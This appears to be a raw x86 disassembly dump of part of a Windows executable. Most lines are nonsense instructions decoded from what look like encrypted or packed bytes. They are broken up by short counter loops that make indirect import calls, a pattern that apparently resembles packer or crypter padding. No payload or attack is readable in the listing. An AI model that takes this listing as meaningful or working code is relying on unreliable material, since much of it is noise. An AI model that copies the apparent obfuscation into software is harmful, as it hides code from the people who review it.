  409dba:	or     al,0x5f
  409dbc:	inc    edi
  409dbd:	pop    es
  409dbe:	sub    eax,0x382f7ba0
  409dc3:	loop   0x409e43
  409dc5:	jle    0x409dff
  409dc7:	jl     0x409e47
  409dc9:	jle    0x409de3
  409dcb:	outs   dx,DWORD PTR ds:[esi]
  409dcc:	push   ds
  409dcd:	sbb    eax,0x5ca2dacb
  409dd2:	out    0x5d,al
  409dd4:	jno    0x409e2a
  409dd6:	and    edx,edi
  409dd8:	mov    ebp,0x93e72c46
  409ddd:	repnz or BYTE PTR [ebp+0x3dcf7495],dh
  409de4:	dec    esi
  409de5:	enter  0xa1f7,0x6
  409de9:	sbb    al,0xe
  409deb:	fs in  eax,dx
  409ded:	ins    BYTE PTR es:[edi],dx
  409dee:	dec    di
  409df0:	xor    DWORD PTR [edi+0x1d579e1d],edi
  409df6:	aas    
  409df7:	pop    ss
  409df8:	fs pop eax
  409dfa:	xor    DWORD PTR [eax-0x4bc84c60],0x21f7c9f2
  409e04:	or     dl,BYTE PTR [edx+0x7b0cbff9]
  409e0a:	(bad)  
  409e0b:	pop    ebx
  409e0c:	adc    al,BYTE PTR [ecx-0xf]
  409e0f:	mov    eax,0x58fe9781
  409e14:	push   ecx
  409e15:	fidiv  WORD PTR [eax-0x2b8aed48]
  409e1b:	pop    ecx
  409e1c:	inc    bx
  409e1e:	in     al,dx
  409e1f:	mov    bl,0x3d
  409e21:	loop   0x409dd4
  409e23:	dec    edx
  409e24:	das    
  409e25:	pop    esp
  409e26:	mov    WORD PTR [esi],fs
  409e28:	out    0xb9,al
  409e2a:	jns    0x409e10
  409e2c:	stc    
  409e2d:	xchg   esp,eax
  409e2e:	dec    edi
  409e2f:	icebp  
  409e30:	scas   eax,DWORD PTR es:[edi]
  409e31:	mov    dl,dh
  409e33:	pushf  
  409e34:	mov    dl,0x8a
  409e36:	xor    DWORD PTR [eax-0x4349ca0f],edx
  409e3c:	ss ss retf 0xf28a
  409e41:	push   edi
  409e42:	out    dx,eax
  409e43:	xchg   DWORD PTR [edx+eax*2-0x1d5e6a25],ebx
  409e4a:	loope  0x409eba
  409e4c:	sbb    al,0x51
  409e4e:	call   0x97e7:0x8316e776
  409e55:	push   ebp
  409e56:	jne    0x409df9
  409e58:	xchg   esp,eax
  409e59:	adc    ah,BYTE PTR [ebp+0x23]
  409e5c:	retf   0x9daf
  409e5f:	retf   
  409e60:	xor    edi,DWORD PTR [ebx+0x2e692459]
  409e66:	jne    0x409e5e
  409e68:	clc    
  409e69:	sahf   
  409e6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e6b:	cmp    edi,DWORD PTR [esi+0x45]
  409e6e:	ja     0x409eb3
  409e70:	aas    
  409e71:	sub    eax,0xf507ce3e
  409e76:	out    0x17,eax
  409e78:	dec    eax
  409e79:	(bad)  
  409e7a:	sub    BYTE PTR [eax],ch
  409e7c:	pusha  
  409e7d:	sub    ecx,DWORD PTR [ebp+0x4be7c4db]
  409e83:	and    BYTE PTR [esp+ecx*1-0x17c5f675],dl
  409e8a:	add    BYTE PTR [ebp-0x6a0c76d0],bl
  409e90:	mov    ebx,0xd258289d
  409e95:	scas   eax,DWORD PTR es:[edi]
  409e96:	sbb    BYTE PTR [ebp+0x47],bh
  409e99:	cmp    edi,ebp
  409e9b:	stos   DWORD PTR es:[edi],eax
  409e9c:	out    0x16,eax
  409e9e:	fdiv   DWORD PTR [edx]
  409ea0:	push   edx
  409ea1:	xor    ah,BYTE PTR [edi+edx*4-0x35828d6a]
  409ea8:	out    0x14,eax
  409eaa:	mov    ah,0x49
  409eac:	mov    eax,ds:0xa408ee07
  409eb1:	test   al,0x14
  409eb3:	mov    esp,0xcc56fa02
  409eb8:	xor    cl,BYTE PTR [edi-0x699befca]
  409ebe:	mov    cs,WORD PTR [esi]
  409ec0:	sbb    dh,BYTE PTR [eax+esi*2-0x6acba4b2]
  409ec7:	mov    ebp,0x92db3f25
  409ecc:	sti    
  409ecd:	(bad)  
  409ece:	or     esi,edx
  409ed0:	fidivr DWORD PTR [edi-0x3a]
  409ed3:	bound  esp,QWORD PTR [esi+0x8fbd341]
  409ed9:	sbb    cl,BYTE PTR [eax]
  409edb:	loopne 0x409e86
  409edd:	sbb    eax,0x3b7e53c9
  409ee2:	retf   0x75b7
  409ee5:	retf   
  409ee6:	aad    0x5e
  409ee8:	stos   BYTE PTR es:[edi],al
  409ee9:	in     eax,0xec
  409eeb:	mov    al,ds:0x9e94ae4c
  409ef0:	mov    ecx,DWORD PTR ds:0x2c0ffe84
  409ef6:	adc    ah,BYTE PTR [edi]
  409ef8:	scas   eax,DWORD PTR es:[edi]
  409ef9:	dec    ebp
  409efa:	xchg   ecx,eax
  409efb:	mov    ecx,0xef79afd8
  409f00:	out    dx,al
  409f01:	or     dh,bh
  409f03:	ins    BYTE PTR es:[edi],dx
  409f04:	xor    bh,BYTE PTR [ebx+edi*1]
  409f07:	mov    esp,0x205ce1d0
  409f0c:	mov    cl,BYTE PTR [ebp-0x7a9d9605]
  409f12:	jnp    0x409f70
  409f14:	ret    
  409f15:	xlat   BYTE PTR ds:[ebx]
  409f16:	nop
  409f17:	adc    eax,ebx
  409f19:	mov    eax,ds:0x7152e62d
  409f1e:	xchg   ebx,eax
  409f1f:	jle    0x409f75
  409f21:	inc    ecx
  409f22:	push   ds
  409f23:	mov    WORD PTR [ecx],cs
  409f25:	adc    DWORD PTR [edi-0x4f],esp
  409f28:	repz dec ebp
  409f2a:	push   cs
  409f2b:	int    0xe1
  409f2d:	mov    esp,0x1104a8ca
  409f32:	jne    0x409edc
  409f34:	out    dx,eax
  409f35:	or     eax,0xdd4581f2
  409f3a:	mov    BYTE PTR [eax+0x3759466a],al
  409f40:	test   DWORD PTR [ebp+ebp*4+0x2707e05],edx
  409f47:	je     0x409ef3
  409f49:	adc    eax,0x9cada482
  409f4e:	mov    ch,ch
  409f50:	or     eax,0xdd2d56d6
  409f55:	mov    esi,0x1be5ce46
  409f5a:	ret    0x191e
  409f5d:	xor    BYTE PTR [ecx],bh
  409f5f:	outs   dx,DWORD PTR ss:[esi]
  409f61:	xchg   ebp,eax
  409f62:	add    dl,BYTE PTR [edi-0xc]
  409f65:	stos   DWORD PTR es:[edi],eax
  409f66:	aam    0x19
  409f68:	int    0xf2
  409f6a:	sbb    bh,BYTE PTR [ecx-0x3e91d5c8]
  409f70:	xor    eax,0xe67dee7e
  409f75:	sub    BYTE PTR [esi-0x29296630],bh
  409f7b:	pop    ebp
  409f7c:	fsubr  st(0),st
  409f7e:	add    DWORD PTR [ecx-0x6091e343],edi
  409f84:	mov    dl,0xec
  409f86:	cmp    edi,esp
  409f88:	mov    edx,0x8f89a0ea
  409f8d:	jb     0x409f3b
  409f8f:	mov    BYTE PTR [esi-0x189de34],ch
  409f95:	ja     0x409f68
  409f97:	in     eax,0x8b
  409f99:	jp     0x409ff5
  409f9b:	into   
  409f9c:	es lahf 
  409f9e:	sub    al,0x6
  409fa0:	jns    0x409f67
  409fa2:	inc    ebx
  409fa3:	dec    ecx
  409fa4:	sahf   
  409fa5:	sbb    dh,al
  409fa7:	imul   ecx,ebx,0x9e0bdbb6
  409fad:	cmc    
  409fae:	jecxz  0x409f86
  409fb0:	inc    ecx
  409fb1:	or     BYTE PTR [edx+eax*1+0x5b415e60],bl
  409fb8:	pop    ebx
  409fb9:	dec    edi
  409fba:	sbb    al,0x73
  409fbc:	arpl   di,cx
  409fbe:	test   DWORD PTR [ebx],eax
  409fc0:	pushf  
  409fc1:	push   0xf5c8d820
  409fc6:	(bad)  
  409fc8:	pop    edx
  409fc9:	or     eax,0xaad3e0a2
  409fce:	push   ds
  409fcf:	test   eax,0xbcd64698
  409fd4:	cld    
  409fd5:	xchg   edi,eax
  409fd6:	push   ebx
  409fd7:	or     edi,DWORD PTR [ecx]
  409fd9:	je     0x409f6e
  409fdb:	ds push edi
  409fdd:	mov    al,0x75
  409fdf:	dec    ebx
  409fe0:	jge    0x40a016
  409fe2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409fe3:	jecxz  0x409fa2
  409fe5:	adc    eax,0x68c06b45
  409fea:	pop    edi
  409feb:	jge    0x409f95
  409fed:	inc    DWORD PTR [ecx+0x70]
  409ff0:	test   BYTE PTR [ecx+0x36],ch
  409ff3:	xchg   ebp,eax
  409ff4:	or     BYTE PTR [esi-0x2b],al
  409ff7:	xor    DWORD PTR [edx-0x64],0x46f587ad
  409ffe:	xchg   esp,eax
  409fff:	pop    ss
  40a000:	add    esp,DWORD PTR [ecx-0x7]
  40a003:	retf   
  40a004:	jge    0x40a054
  40a006:	es pop ds
  40a008:	(bad)
  40a00d:	mov    esp,0xaf0fe878
  40a012:	sar    BYTE PTR [ecx+0x4573],1
  40a018:	mov    edi,DWORD PTR ds:0x433753
  40a01e:	sbb    DWORD PTR ds:0x43368f,edi
  40a024:	add    edx,ecx
  40a026:	mov    esi,0x7879
  40a02b:	mov    edi,0x1556
  40a030:	xchg   esi,ecx
  40a032:	adc    DWORD PTR ds:0x4336e3,edi
  40a038:	sub    edx,edi
  40a03a:	and    ecx,DWORD PTR ds:0x4336a3
  40a040:	xor    esi,esi
  40a042:	and    DWORD PTR ds:0x4336db,0x0
  40a04c:	mov    ecx,DWORD PTR ds:0x4336db
  40a052:	inc    ecx
  40a053:	mov    DWORD PTR ds:0x4336db,ecx
  40a059:	cmp    DWORD PTR ds:0x4336db,0x2e
  40a060:	jne    0x40a076
  40a066:	push   0x4338be
  40a06b:	push   0x400000
  40a070:	call   DWORD PTR ds:0x4120dc
  40a076:	cmp    DWORD PTR ds:0x4336db,0x1f
  40a07d:	jb     0x40a04c
  40a083:	mov    DWORD PTR [ebp-0x28],esi
  40a086:	mov    DWORD PTR ds:0x43368b,0x11
  40a090:	cmp    DWORD PTR ds:0x43368b,0x0
  40a097:	je     0x40a0f0
  40a09d:	cmp    DWORD PTR ds:0x43368b,0x6
  40a0a4:	jne    0x40a0be
  40a0aa:	push   DWORD PTR [ebp-0x24]
  40a0ad:	push   0x64fc
  40a0b2:	push   DWORD PTR [ebp-0x24]
  40a0b5:	push   DWORD PTR [ebp-0x14]
  40a0b8:	call   DWORD PTR ds:0x4122a4
  40a0be:	cmp    DWORD PTR ds:0x43368b,0x7
  40a0c5:	jne    0x40a0d8
  40a0cb:	mov    ecx,DWORD PTR ds:0x43368b
  40a0d1:	dec    ecx
  40a0d2:	mov    DWORD PTR ds:0x43368b,ecx
  40a0d8:	mov    ecx,DWORD PTR ds:0x43368b
  40a0de:	dec    ecx
  40a0df:	mov    DWORD PTR ds:0x43368b,ecx
  40a0e5:	jmp    0x40a090
  40a0ea:	adc    DWORD PTR ds:0x433683,ecx
  40a0f0:	mov    DWORD PTR [ebp-0x2c],esi
  40a0f3:	mov    ecx,DWORD PTR ds:0x4336ef
  40a0f9:	sub    ecx,DWORD PTR ds:0x433693
  40a0ff:	mov    DWORD PTR ds:0x4336ef,ecx
  40a105:	mov    DWORD PTR [ebp-0x14],esi
  40a108:	or     DWORD PTR ds:0x4336e7,0x653d
  40a112:	mov    DWORD PTR [ebp-0x8],esi
  40a115:	jmp    0x40a378
  40a11a:	mov    gs,ebp
  40a11c:	data16 fwait
  40a11e:	gs mov cl,0x53
  40a121:	jmp    0x31127192
  40a126:	into   
  40a127:	scas   eax,DWORD PTR es:[edi]
  40a128:	sbb    bl,BYTE PTR [edi+0x7e7ee082]
  40a12e:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40a132:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a133:	je     0x40a18c
  40a135:	mov    ebx,0x1632958a
  40a13a:	aas    
  40a13b:	leave  
  40a13c:	icebp  
  40a13d:	add    BYTE PTR [edx],bh
  40a13f:	and    edx,ecx
  40a141:	adc    DWORD PTR [edx-0x7b444a17],esp
  40a147:	bound  esp,QWORD PTR [ecx]
  40a149:	push   eax
  40a14a:	arpl   WORD PTR [ebx],si
  40a14c:	push   ds
  40a14d:	mov    ds:0x120f7187,al
  40a152:	stos   BYTE PTR es:[edi],al
  40a153:	cwde   
  40a154:	mov    ds:0xcd463845,al
  40a159:	cli    
  40a15a:	out    dx,eax
  40a15b:	popa   
  40a15c:	and    dl,BYTE PTR [edi-0xc]
  40a15f:	cmp    al,0x8f
  40a161:	stos   BYTE PTR es:[edi],al
  40a162:	push   eax
  40a163:	test   eax,0xaae19b92
  40a168:	sbb    BYTE PTR [ebp-0x505b4c1a],ah
  40a16e:	enter  0x2bd9,0xf4
  40a172:	mov    edi,0x8fc6fca6
  40a177:	xchg   ecx,eax
  40a178:	stos   DWORD PTR es:[edi],eax
  40a179:	mov    DWORD PTR [ebp-0x2398e549],ecx
  40a17f:	mov    ds:0x1fdd95eb,eax
  40a184:	clc    
  40a185:	mov    dl,0x78
  40a187:	cmp    eax,0xe62e0b13
  40a18c:	and    eax,0xf9401396
  40a191:	or     bp,0xffa1
  40a195:	dec    esi
  40a196:	nop
  40a197:	xor    al,0x8e
  40a199:	jmp    0xe35e40b2
  40a19e:	xor    al,0x8e
  40a1a0:	xchg   edx,eax
  40a1a1:	adc    al,0x4f
  40a1a3:	movhps xmm5,QWORD PTR [ebx-0x36c76fcb]
  40a1aa:	ror    DWORD PTR [edi+0x5e],0xa2
  40a1ae:	dec    eax
  40a1af:	repnz pop ss
  40a1b1:	add    ecx,DWORD PTR [ebp+0x22]
  40a1b4:	cmp    ebx,ecx
  40a1b6:	stc    
  40a1b7:	jl     0x40a151
  40a1b9:	mov    ah,0x18
  40a1bb:	mov    ecx,0x88a5826c
  40a1c0:	push   edx
  40a1c1:	sbb    esp,edi
  40a1c3:	inc    edx
  40a1c4:	fs xchg dh,bl
  40a1c7:	sbb    BYTE PTR [esp+edi*2],dl
  40a1ca:	mov    WORD PTR [eax+0x2acf9e00],cs
  40a1d0:	sbb    cl,BYTE PTR [esi+edx*2-0x9]
  40a1d4:	aas    
  40a1d5:	cmp    eax,0x7799d23e
  40a1da:	pop    ebp
  40a1db:	push   esp
  40a1dc:	in     al,dx
  40a1dd:	ss mov edi,0x2b48c1f4
  40a1e3:	repz push ss
  40a1e5:	pop    esi
  40a1e6:	mov    ebx,0x1323b38
  40a1eb:	jns    0x40a25d
  40a1ed:	adc    DWORD PTR gs:[ecx],esp
  40a1f0:	fdivrp st(5),st
  40a1f2:	in     al,0x73
  40a1f4:	mov    bh,0xb
  40a1f6:	stos   DWORD PTR es:[edi],eax
  40a1f7:	pop    esp
  40a1f8:	fsubr  st(5),st
  40a1fa:	jmp    DWORD PTR [ecx+0xa68238e]
  40a200:	aas    
  40a201:	cmp    al,0xf6
  40a203:	test   al,0xc6
  40a205:	inc    ebp
  40a206:	xor    DWORD PTR [ecx+0x70af510b],edi
  40a20c:	jne    0x40a1f0
  40a20e:	push   esp
  40a20f:	shr    DWORD PTR [esi+0x4ed702f5],cl
  40a215:	mov    es,WORD PTR [ebx-0x5b]
  40a218:	and    BYTE PTR [esi-0x2cfeadcf],cl
  40a21e:	add    al,0x7b
  40a220:	xlat   BYTE PTR ds:[ebx]
  40a221:	pop    ebp
  40a222:	push   ebp
  40a223:	es inc ecx
  40a225:	aam    0x30
  40a227:	fcomip st,st(6)
  40a229:	call   0x47ac:0x3350adfe
  40a230:	ss daa 
  40a232:	ficomp WORD PTR [ebp-0x3a]
  40a235:	cli    
  40a236:	xchg   ebx,eax
  40a237:	mov    esi,0xc7583f8d
  40a23c:	sar    dh,cl
  40a23e:	test   eax,0x7c0c4fd0
  40a244:	cmc    
  40a245:	sti    
  40a246:	push   edx
  40a247:	push   ss
  40a248:	fs jns 0x40a254
  40a24b:	sbb    eax,0x6e27bfe9
  40a250:	pushf  
  40a251:	or     ah,BYTE PTR [edx-0x61]
  40a254:	arpl   WORD PTR [esi-0x8],bp
  40a257:	in     eax,0x67
  40a259:	(bad)  
  40a25a:	mov    eax,0x5ac1231a
  40a25f:	xchg   BYTE PTR [ecx],al
  40a261:	aaa    
  40a262:	(bad)  
  40a263:	rcl    BYTE PTR [eax+0x28a101ae],1
  40a269:	(bad)  
  40a26a:	push   esi
  40a26b:	stos   DWORD PTR es:[edi],eax
  40a26c:	sar    edi,0x79
  40a26f:	sub    eax,0x2a6d888b
  40a274:	dec    ebx
  40a275:	or     DWORD PTR [edx+eax*4+0x2319b526],0x8a425a28
  40a280:	mov    WORD PTR [edi-0x68],ds
  40a283:	push   ebp
  40a284:	pop    ecx
  40a285:	ss xchg ebp,eax
  40a287:	push   0x67815002
  40a28c:	jmp    0xffce:0xb1a040d4
  40a293:	adc    DWORD PTR [eax-0x4b],edx
  40a296:	sbb    al,0xfc
  40a298:	imul   dl
  40a29a:	shl    DWORD PTR [ecx+0x3d],1
  40a29d:	add    bl,dl
  40a29f:	inc    edi
  40a2a0:	imul   ebx,DWORD PTR [edx-0x2801dd58],0xe87b3c9c
  40a2aa:	aam    0x25
  40a2ac:	mov    ds:0xbc4efadb,eax
  40a2b1:	cmc    
  40a2b2:	mov    DWORD PTR [esp+ebx*4+0x4b03f5c1],esi
  40a2b9:	dec    edx
  40a2ba:	add    eax,0x3aa68589
  40a2bf:	iret   
  40a2c0:	pop    ebx
  40a2c1:	dec    esp
  40a2c2:	test   al,0xa
  40a2c4:	ins    DWORD PTR es:[edi],dx
  40a2c5:	fidiv  DWORD PTR [ecx+0xd9d9ccc]
  40a2cb:	adc    al,dh
  40a2cd:	popa   
  40a2ce:	xchg   ebx,eax
  40a2cf:	daa    
  40a2d0:	repnz push ebp
  40a2d2:	imul   edi,ebx,0x2
  40a2d5:	vmaxss xmm6,xmm4,DWORD PTR [ebp+ebx*8+0x9456ef0]
  40a2de:	stos   BYTE PTR es:[edi],al
  40a2df:	mov    al,0x91
  40a2e1:	xchg   ecx,eax
  40a2e2:	lahf   
  40a2e3:	loope  0x40a2a1
  40a2e5:	fucomip st,st(5)
  40a2e7:	icebp  
  40a2e8:	mov    esi,0xb0e76a92
  40a2ed:	xor    BYTE PTR [ebp+0x58a6d88a],0x55
  40a2f4:	imul   ebp,DWORD PTR [esi+0x60],0xffffffef
  40a2f8:	mov    dl,0x64
  40a2fa:	test   BYTE PTR [eax+0x5684b0e9],0x95
  40a301:	cdq    
  40a302:	idiv   DWORD PTR [ebx]
  40a304:	std    
  40a305:	cmc    
  40a306:	mov    al,ds:0x37210613
  40a30b:	sub    al,0x2a
  40a30d:	mov    esp,ebp
  40a30f:	in     eax,0xbe
  40a311:	xor    DWORD PTR [edx-0x8],ebp
  40a314:	add    BYTE PTR [ebx+0x3a2191eb],dl
  40a31a:	retf   0x1dc
  40a31d:	jl     0x40a30d
  40a31f:	pushf  
  40a320:	push   esp
  40a321:	mov    ss,WORD PTR [edi-0x6832b95c]
  40a327:	ficomp DWORD PTR [edx]
  40a329:	cwde   
  40a32a:	jae    0x40a3a7
  40a32c:	xlat   BYTE PTR ds:[ebx]
  40a32d:	sub    dh,BYTE PTR [ecx+0x29]
  40a330:	enter  0x11fa,0x35
  40a334:	mov    edx,0x5e97a5f0
  40a339:	push   ebx
  40a33a:	stos   BYTE PTR es:[edi],al
  40a33b:	xchg   esi,eax
  40a33c:	fldenv [ecx+0x37f21f54]
  40a342:	shl    ebx,0xa8
  40a345:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a346:	aas    
  40a347:	xchg   edx,eax
  40a348:	data16 mov dl,0x95
  40a34b:	mov    ah,0x6b
  40a34d:	push   ebx
  40a34e:	pop    ecx
  40a34f:	int3   
  40a350:	add    al,0x5a
  40a352:	cmp    bh,BYTE PTR [edx]
  40a354:	gs ins DWORD PTR es:[edi],dx
  40a356:	(bad)  
  40a358:	jbe    0x40a325
  40a35a:	imul   esi,DWORD PTR ds:0x695987ba,0x15
  40a361:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a362:	pop    ecx
  40a363:	clc    
  40a364:	or     BYTE PTR [ecx+0x23d3f32d],cl
  40a36a:	mov    edi,0x24db19ae
  40a36f:	add    al,0x4e
  40a371:	push   eax
  40a372:	push   ds
  40a373:	mov    ds:0xaf431deb,eax
  40a378:	mov    ecx,DWORD PTR [ebp-0x18]
  40a37b:	xor    ecx,eax
  40a37d:	and    DWORD PTR ds:0x43367b,0x0
  40a387:	jmp    0x40a39a
  40a38c:	xor    eax,eax
  40a38e:	xor    eax,DWORD PTR ds:0x43367b
  40a394:	inc    eax
  40a395:	mov    ds:0x43367b,eax
  40a39a:	cmp    DWORD PTR ds:0x43367b,0x16
  40a3a1:	jae    0x40a3e1
  40a3a7:	cmp    DWORD PTR ds:0x43367b,0x21
  40a3ae:	jne    0x40a3dc
  40a3b4:	push   DWORD PTR [ebp-0x10]
  40a3b7:	push   0x43376f
  40a3bc:	push   DWORD PTR [ebp-0x1c]
  40a3bf:	push   0x4336eb
  40a3c4:	push   0x6a7c
  40a3c9:	push   DWORD PTR [ebp-0x14]
  40a3cc:	push   0x4bcb
  40a3d1:	push   0x5e17
  40a3d6:	call   DWORD PTR ds:0x412358
  40a3dc:	jmp    0x40a38c
  40a3e1:	xor    edi,edi
  40a3e3:	mov    DWORD PTR ds:0x4336e7,0x1d
  40a3ed:	cmp    DWORD PTR ds:0x4336e7,0x0
  40a3f4:	je     0x40a44f
  40a3fa:	cmp    DWORD PTR ds:0x4336e7,0x3
  40a401:	jne    0x40a422
  40a407:	push   DWORD PTR [ebp-0xc]
  40a40a:	push   0x73f7
  40a40f:	push   DWORD PTR [ebp-0x24]
  40a412:	push   0x3e3a
  40a417:	push   0x433717
  40a41c:	call   DWORD PTR ds:0x4120e0
  40a422:	cmp    DWORD PTR ds:0x4336e7,0x4
  40a429:	jne    0x40a43a
  40a42f:	mov    eax,ds:0x4336e7
  40a434:	dec    eax
  40a435:	mov    ds:0x4336e7,eax
  40a43a:	mov    eax,ds:0x4336e7
  40a43f:	dec    eax
  40a440:	mov    ds:0x4336e7,eax
  40a445:	jmp    0x40a3ed
  40a44a:	or     eax,0x5ffd
  40a44f:	add    ecx,ebx
  40a451:	mov    DWORD PTR ds:0x43369f,0x630a
  40a45b:	mov    DWORD PTR [ebp-0x20],ecx
  40a45e:	mov    eax,ds:0x4337af
  40a463:	mov    eax,DWORD PTR [ebp-0x20]
  40a466:	je     0x40bc6c
  40a46c:	mov    eax,DWORD PTR [ebp-0x4]
  40a46f:	xor    eax,0x7510854
  40a474:	sbb    DWORD PTR ds:0x4337a3,0x433727
  40a47e:	add    eax,ebx
  40a480:	mov    DWORD PTR ds:0x433687,0x108a
  40a48a:	jmp    0x40a6ed
  40a48f:	imul   ecx,DWORD PTR [edx+eax*1+0x2f],0x21
  40a494:	jno    0x40a509
  40a496:	dec    eax
  40a497:	test   DWORD PTR [eax-0x44],esi
  40a49a:	pusha  
  40a49b:	dec    ebx
  40a49c:	cwde   
  40a49d:	sbb    al,cl
  40a49f:	dec    esp
  40a4a0:	out    dx,al
  40a4a1:	jle    0x40a521
  40a4a3:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40a4a7:	into   
  40a4a8:	pop    ss
  40a4a9:	xor    ecx,DWORD PTR [edx]
  40a4ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a4ac:	dec    eax
  40a4ad:	sar    DWORD PTR [edi-0x6b],0x48
  40a4b1:	inc    edi
  40a4b2:	ins    DWORD PTR es:[edi],dx
  40a4b3:	xor    eax,edi
  40a4b5:	sbb    eax,0x428a1842
  40a4ba:	das    
  40a4bb:	addr16 pusha 
  40a4bd:	add    esp,esp
  40a4bf:	fcomi  st,st(4)
  40a4c1:	sbb    al,0x74
  40a4c3:	or     BYTE PTR [esp+ecx*1+0x7fd5f2cf],dl
  40a4ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a4cb:	sar    DWORD PTR [ebp-0x1e],1
  40a4ce:	or     cl,0x23
  40a4d1:	xlat   BYTE PTR ds:[ebx]
  40a4d2:	mov    eax,0x13895ec7
  40a4d7:	lods   eax,DWORD PTR ds:[esi]
  40a4d8:	call   0xe576:0x2d6aabae
  40a4df:	fcomp  QWORD PTR [eax-0x688f73cd]
  40a4e5:	out    dx,eax
  40a4e6:	inc    BYTE PTR [ecx]
  40a4e8:	cmp    ebp,esi
  40a4ea:	add    BYTE PTR [esi+0x2e97dda9],bl
  40a4f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a4f1:	sti    
  40a4f2:	add    DWORD PTR [edi],ebx
  40a4f4:	addr16 push eax
  40a4f6:	loopne 0x40a4fa
  40a4f8:	dec    edi
  40a4f9:	(bad)  
  40a4fa:	push   ebx
  40a4fb:	mov    bl,0x3b
  40a4fd:	pop    eax
  40a4fe:	mov    ch,0x9
  40a500:	or     eax,0x4f40b8fc
  40a505:	mov    ebp,0xfb9bd6dc
  40a50a:	(bad)  
  40a50b:	test   cl,dl
  40a50d:	mov    edi,0x7dfbc18b
  40a512:	xor    cl,BYTE PTR [ebp+0x2c]
  40a515:	in     eax,dx
  40a516:	ret    
  40a517:	call   0x57c0263b
  40a51c:	cdq    
  40a51d:	mov    al,ds:0xcde6023e
  40a522:	push   eax
  40a523:	jg     0x40a56e
  40a525:	sub    eax,0xb5f11e85
  40a52a:	or     BYTE PTR [ebx-0x66],al
  40a52d:	push   ds
  40a52e:	sub    al,ch
  40a530:	sbb    DWORD PTR [esi*1-0x641fcd38],ebp
  40a537:	pop    ecx
  40a538:	out    0x41,eax
  40a53a:	sub    esp,eax
  40a53c:	outs   dx,DWORD PTR ds:[esi]
  40a53d:	sub    eax,0x907b91f8
  40a542:	sbb    dh,BYTE PTR [ecx-0x32]
  40a545:	mov    esi,0x29200df0
  40a54a:	pop    esi
  40a54b:	lds    esi,FWORD PTR [eax+ecx*1]
  40a54e:	in     eax,0x40
  40a550:	fimul  WORD PTR [edx]
  40a552:	loopne 0x40a4eb
  40a554:	adc    eax,0xf45227ed
  40a559:	retf   0x910b
  40a55c:	shl    DWORD PTR [ebx-0x10],0x46
  40a560:	les    ecx,FWORD PTR [ebp+ebp*1+0x74]
  40a564:	or     BYTE PTR [ecx],bl
  40a566:	xchg   bl,dh
  40a568:	xchg   ebp,eax
  40a569:	pop    ds
  40a56a:	lock and eax,0xbc7453ea
  40a570:	int3   
  40a571:	jp     0x40a532
  40a573:	ret    
  40a574:	add    al,0xa3
  40a576:	cld    
  40a577:	adc    BYTE PTR [eax+0x1],cl
  40a57a:	jno    0x40a5a8
  40a57c:	cmp    bl,BYTE PTR [ebx-0x259e2246]
  40a582:	les    edx,FWORD PTR [ecx+eiz*2+0x5b]
  40a586:	aaa    
  40a587:	sbb    eax,0x14e451ed
  40a58c:	and    al,ch
  40a58e:	lods   eax,DWORD PTR ds:[esi]
  40a58f:	cmp    eax,0xe818792e
  40a594:	adc    ecx,DWORD PTR [ebx-0x3e35398f]
  40a59a:	sbb    ah,ah
  40a59c:	xchg   bl,dh
  40a59e:	les    edi,FWORD PTR [edi]
  40a5a0:	fld    QWORD PTR [esi-0x456aaa3f]
  40a5a6:	(bad)  
  40a5a8:	push   es
  40a5a9:	sbb    DWORD PTR [ebp+esi*1-0x20],esp
  40a5ad:	adc    dh,bl
  40a5af:	adc    BYTE PTR [eax+0x26],bl
  40a5b2:	loopne 0x40a580
  40a5b4:	adc    DWORD PTR [ebp-0x5d],edx
  40a5b7:	push   es
  40a5b8:	test   al,0x85
  40a5ba:	out    0x91,eax
  40a5bc:	out    dx,eax
  40a5bd:	gs mov ah,0x93
  40a5c0:	push   ss
  40a5c1:	pop    eax
  40a5c2:	xchg   DWORD PTR [edx],edx
  40a5c4:	popf   
  40a5c5:	adc    BYTE PTR [edx+0x28],ch
  40a5c8:	xor    esp,DWORD PTR [edi]
  40a5ca:	pusha  
  40a5cb:	in     eax,dx
  40a5cc:	loope  0x40a5d0
  40a5ce:	pop    edx
  40a5cf:	mov    eax,ds:0x53cc90fe
  40a5d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a5d5:	sbb    al,0xf8
  40a5d7:	mov    al,ds:0x5ce958ca
  40a5dc:	push   ebx
  40a5dd:	xchg   edx,eax
  40a5de:	push   ds
  40a5df:	and    BYTE PTR [ebp-0x6437a85e],ch
  40a5e5:	(bad)  
  40a5e6:	push   cs
  40a5e7:	xor    BYTE PTR [eax-0x24],0xa9
  40a5eb:	jmp    0xaab5:0x6fc57097
  40a5f2:	pop    ds
  40a5f3:	and    eax,0x2706584b
  40a5f8:	fisttp WORD PTR [edi+0x56fe059a]
  40a5fe:	pop    edx
  40a5ff:	pop    es
  40a600:	xchg   edx,eax
  40a601:	into   
  40a602:	cdq    
  40a603:	or     BYTE PTR [edi],bh
  40a605:	pushf  
  40a606:	pop    eax
  40a607:	aaa    
  40a608:	clc    
  40a609:	rcl    BYTE PTR [ebx+0x27ff5a4c],1
  40a60f:	aaa    
  40a610:	jle    0x40a5a7
  40a612:	jae    0x40a5d7
  40a614:	xor    DWORD PTR [ebx-0x1e684d37],esp
  40a61a:	and    al,0xd1
  40a61c:	sbb    esi,esi
  40a61e:	aam    0x4a
  40a620:	imul   ebp,ebp,0xae10d8f1
  40a626:	call   0x1b18a5df
  40a62b:	push   cs
  40a62c:	sahf   
  40a62d:	stos   BYTE PTR es:[edi],al
  40a62e:	fisttp WORD PTR [eax-0x49]
  40a631:	das    
  40a632:	ret    
  40a633:	repz mov esi,?
  40a636:	lock xchg ecx,eax
  40a638:	sbb    DWORD PTR [esi+0x3db7dd8b],0xb7bf4f0c
  40a642:	push   es
  40a643:	mov    esp,0x2fd7c18
  40a648:	sub    eax,0x3710b600
  40a64d:	inc    ebp
  40a64e:	dec    ecx
  40a64f:	xor    al,0x41
  40a651:	fcmovne st,st(3)
